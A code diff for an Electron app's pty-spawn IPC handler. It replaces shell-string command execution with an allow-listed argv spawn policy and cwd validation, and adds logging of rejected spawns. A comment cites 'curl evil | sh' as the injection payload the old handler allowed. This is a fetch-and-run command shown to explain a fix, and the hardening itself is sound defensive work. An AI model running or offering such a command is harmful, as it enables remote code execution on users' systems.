@@ -1,27 +1,24 @@
 import type { IpcMain, BrowserWindow } from "electron";
+import log from "electron-log/main";
 import * as os from "node:os";
 import * as fs from "node:fs";
 import * as path from "node:path";
 import { spawnSync } from "node:child_process";
 import { installAgentHooks } from "./agent-hooks";
 import { IPC } from "./ipc-channels";
-import { resolveShell, sanitizedProcessEnv, shellArgsForCommand } from "./shell-env";
-
-function assertCwd(cwd: string): void {
-  if (!cwd) throw new Error("cwd is required");
-  let stat: fs.Stats;
-  try {
-    stat = fs.statSync(cwd);
-  } catch {
-    throw new Error(`cwd does not exist: ${cwd}`);
-  }
-  if (!stat.isDirectory()) throw new Error(`cwd is not a directory: ${cwd}`);
-  try {
-    fs.accessSync(cwd, fs.constants.R_OK | fs.constants.X_OK);
-  } catch {
-    throw new Error(`cwd is not accessible (check permissions): ${cwd}`);
-  }
-}
+import { safeHandle } from "./ipc-safe-handle";
+import {
+  resolveCommandOnPath,
+  resolveShell,
+  sanitizedProcessEnv,
+  shellArgsForCommand,
+} from "./shell-env";
+import { loadProjectRoots } from "./project-roots";
+import {
+  resolveSpawnPlan,
+  SpawnPolicyError,
+  type SpawnRequest,
+} from "./pty-spawn-policy";
 
 function sanitizeEnv(): Record<string, string> {
   const out = sanitizedProcessEnv();
@@ -72,6 +69,16 @@ type Pty = {
 
 const INTERRUPT_COOLDOWN_MS = 2000;
 const SCAN_TAIL_MAX = 256;
+
+const MAX_TCP_PORT = 65535;
+const LSOF_PROBE_TIMEOUT_MS = 2_000;
+// Time we'll wait for SIGTERM to take before escalating to SIGKILL (port-kill)
+// or before giving up the wait (pty kill). Same grace for both: 1.5s.
+const SIGTERM_GRACE_MS = 1_500;
+const PORT_KILL_POLL_INTERVAL_MS = 100;
+const PTY_EXIT_POLL_INTERVAL_MS = 50;
+const DEFAULT_PTY_COLS = 100;
+const DEFAULT_PTY_ROWS = 30;
 
 export function hasClaudeInterruptPrompt(text: string): boolean {
   return (
@@ -178,12 +185,12 @@ function sleep(ms: number): Promise<void> {
 }
 
 function pidsListeningOnPort(port: number): number[] {
-  if (!Number.isInteger(port) || port <= 0 || port > 65535) return [];
+  if (!Number.isInteger(port) || port <= 0 || port > MAX_TCP_PORT) return [];
   if (os.platform() === "win32") return [];
 
   const result = spawnSync("lsof", ["-nP", `-tiTCP:${port}`, "-sTCP:LISTEN"], {
     encoding: "utf8",
-    timeout: 2000,
+    timeout: LSOF_PROBE_TIMEOUT_MS,
   });
   if (result.error || result.status !== 0) return [];
 
@@ -209,9 +216,9 @@ async function killPidsListeningOnPort(port: number): Promise<PortKillResult> {
   }
 
   if (killed.length > 0) {
-    const deadline = Date.now() + 1500;
+    const deadline = Date.now() + SIGTERM_GRACE_MS;
     while (Date.now() < deadline && pidsListeningOnPort(port).some((pid) => killed.includes(pid))) {
-      await sleep(100);
+      await sleep(PORT_KILL_POLL_INTERVAL_MS);
     }
     for (const pid of pidsListeningOnPort(port).filter((pid) => killed.includes(pid))) {
       try {
@@ -232,9 +239,9 @@ async function killPty(p: Pty): Promise<boolean> {
       exited = true;
     });
     p.proc.kill();
-    const deadline = Date.now() + 1500;
+    const deadline = Date.now() + SIGTERM_GRACE_MS;
     while (!exited && Date.now() < deadline) {
-      await sleep(50);
+      await sleep(PTY_EXIT_POLL_INTERVAL_MS);
     }
     sub?.dispose?.();
     return true;
@@ -247,56 +254,80 @@ async function killPty(p: Pty): Promise<boolean> {
 
 export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindow | null) {
   ensureClaudeShiftEnterBinding();
-  ipcMain.handle(
-      IPC.ptySpawn,
-    (
-      _evt,
-      opts: {
-        taskId: string;
-        cwd: string;
-        command: string;
-        args?: string[];
-        cols?: number;
-        rows?: number;
-        agent?: string;
-        mcEnv?: { apiUrl?: string; token?: string };
-      }
-    ) => {
+  safeHandle(
+    IPC.ptySpawn,
+    (_evt, opts: SpawnRequest) => {
       const pty = loadNodePty();
-      const isWindows = os.platform() === "win32";
-      const userShell = resolveShell();
-      assertCwd(opts.cwd);
+      const platform = os.platform();
 
-      installAgentHooks(opts.agent, opts.cwd);
+      // Validate cwd, agent allow-list, and command shape BEFORE spawning. The
+      // pre-fix handler joined `command + args` into a shell string and handed
+      // it to `sh -l -c`, which made `pty:spawn` a direct RCE primitive — a
+      // briefly-compromised renderer could pass `curl evil | sh` as `command`
+      // and get full local execution. The policy module rejects anything that
+      // isn't an allow-listed agent binary spawned with a clean argv array, or
+      // an explicitly opted-in user-shell terminal confined to a project root.
+      let plan: ReturnType<typeof resolveSpawnPlan>;
+      try {
+        plan = resolveSpawnPlan(opts, {
+          projectRoots: loadProjectRoots,
+          resolveCommand: (name) => resolveCommandOnPath(name, sanitizedProcessEnv()),
+          resolveShell: () => ({
+            shell: resolveShell(),
+            shellArgs: (cmd) => shellArgsForCommand(resolveShell(), cmd, platform),
+          }),
+        });
+      } catch (err) {
+        if (err instanceof SpawnPolicyError) {
+          // User-reportable failures end up as a single line in `term.writeln`
+          // on the renderer; a main-side log keeps the rejection code, the
+          // requesting agent, and the cwd available when a user files a "spawn
+          // failed" report, without echoing the agent's argv (which may carry
+          // session ids the user wouldn't want in a paste).
+          log.warn("pty.spawn.rejected", {
+            code: err.code,
+            agent: opts.agent ?? null,
+            shell: opts.shell === true,
+            cwd: opts.cwd,
+            taskId: opts.taskId,
+          });
+          throw new Error(`pty:spawn rejected (${err.code}): ${err.message}`);
+        }
+        throw err;
+      }
+
+      // Use the canonical cwd from the plan, not the original request, so a
+      // symlink-swap race between validation and spawn can't move us into a
+      // post-validation target outside the project root.
+      installAgentHooks(opts.agent, plan.cwd);
 
       const env = sanitizeEnv();
       env.MC_TASK_ID = opts.taskId;
       if (opts.mcEnv?.apiUrl) env.MC_API_URL = opts.mcEnv.apiUrl;
       if (opts.mcEnv?.token) env.MC_API_TOKEN = opts.mcEnv.token;
 
-      // If a command was supplied, run it through the user's shell with
-      // platform-appropriate arguments. This loads the user's PATH and forks the
-      // command directly, so we don't depend on a write-after-spawn prompt race.
-      // When the agent CLI exits, the pty exits too — the renderer treats that
-      // as the signal to delete the task.
-      const cmd = opts.command ? [opts.command, ...(opts.args ?? [])].join(" ") : undefined;
-      const shellArgs = shellArgsForCommand(userShell, cmd, isWindows ? "win32" : os.platform());
+      // Agent mode spawns the binary directly with a real argv array, bypassing
+      // the login shell entirely so shell metacharacters in args can't be
+      // re-parsed. Shell mode keeps the `sh -l -c` path for user-driven shell
+      // terminals where command interpretation IS the feature.
+      const spawnTarget = plan.mode === "agent" ? plan.binary : plan.shellPath;
+      const spawnArgs = plan.mode === "agent" ? plan.argv : plan.shellArgs;
 
       let proc: import("node-pty").IPty;
       try {
-        proc = pty.spawn(userShell, shellArgs, {
+        proc = pty.spawn(spawnTarget, spawnArgs, {
           name: "xterm-256color",
-          cols: opts.cols ?? 100,
-          rows: opts.rows ?? 30,
-          cwd: opts.cwd,
+          cols: opts.cols ?? DEFAULT_PTY_COLS,
+          rows: opts.rows ?? DEFAULT_PTY_ROWS,
+          cwd: plan.cwd,
           env,
         });
       } catch (err: any) {
         const msg = err?.message ?? String(err);
         if (msg.includes("posix_spawnp")) {
           throw new Error(
-            `posix_spawnp failed for shell="${userShell}" cwd="${opts.cwd}". ` +
-              `Verify the shell exists and the cwd is a readable directory. ` +
+            `posix_spawnp failed for target="${spawnTarget}" cwd="${plan.cwd}". ` +
+              `Verify the binary exists and the cwd is a readable directory. ` +
               `Original: ${msg}`
           );
         }
@@ -332,18 +363,19 @@ export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindo
       });
 
       return { ptyId: id };
-    }
+    },
+    ipcMain,
   );
 
-  ipcMain.handle(IPC.ptyWrite, (_evt, { ptyId, data }: { ptyId: string; data: string }) => {
+  safeHandle(IPC.ptyWrite, (_evt, { ptyId, data }: { ptyId: string; data: string }) => {
     const p = ptys.get(ptyId);
     if (!p) return false;
     p.proc.write(data);
     return true;
-  });
+  }, ipcMain);
 
-  ipcMain.handle(
-      IPC.ptyResize,
+  safeHandle(
+    IPC.ptyResize,
     (_evt, { ptyId, cols, rows }: { ptyId: string; cols: number; rows: number }) => {
       const p = ptys.get(ptyId);
       if (!p) return false;
@@ -353,10 +385,11 @@ export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindo
         /* swallow */
       }
       return true;
-    }
+    },
+    ipcMain,
   );
 
-  ipcMain.handle(IPC.ptyKill, (_evt, { ptyId }: { ptyId: string }) => {
+  safeHandle(IPC.ptyKill, (_evt, { ptyId }: { ptyId: string }) => {
     const p = ptys.get(ptyId);
     if (!p) return false;
     try {
@@ -366,9 +399,9 @@ export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindo
     }
     ptys.delete(ptyId);
     return true;
-  });
+  }, ipcMain);
 
-  ipcMain.handle(
+  safeHandle(
     IPC.ptyKillLaunchProcesses,
     async (
       _evt,
@@ -381,18 +414,19 @@ export function registerPtyHandlers(ipcMain: IpcMain, getWin: () => BrowserWindo
       await Promise.all(targets.map((p) => killPty(p)));
 
       const ports = [...new Set(opts.ports ?? [])].filter(
-        (port) => Number.isInteger(port) && port > 0 && port <= 65535
+        (port) => Number.isInteger(port) && port > 0 && port <= MAX_TCP_PORT
       );
       const portResults = await Promise.all(ports.map((port) => killPidsListeningOnPort(port)));
       return { ptyCount: targets.length, ports: portResults };
-    }
+    },
+    ipcMain,
   );
 
-  ipcMain.handle(IPC.ptyReplay, (_evt, { ptyId }: { ptyId: string }) => {
+  safeHandle(IPC.ptyReplay, (_evt, { ptyId }: { ptyId: string }) => {
     const p = ptys.get(ptyId);
     if (!p) return "";
     return p.buffer.join("");
-  });
+  }, ipcMain);
 }
 
 export function killAllPtys() {
